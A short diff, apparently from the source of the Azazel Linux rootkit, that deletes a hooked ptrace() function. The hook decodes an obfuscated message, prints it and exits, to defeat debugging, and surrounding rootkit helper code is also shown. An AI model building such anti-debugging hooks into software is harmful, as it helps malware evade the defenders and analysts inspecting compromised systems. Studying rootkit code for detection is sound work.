@@ -129,14 +129,6 @@ void init(void) {
 	azazel_init();
 }
 
-long ptrace(void *request, pid_t pid, void *addr, void *data) {
-	char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
-	x(anti_debug_msg);
-	printf("%s\n",anti_debug_msg);
-	cleanup(anti_debug_msg, strlen(anti_debug_msg));
-	exit(-1);
-}
-
 int parse_environ(char *stack, int len, char *needle) {
 	DEBUG("parse_environ\n");
 	char *step = stack;
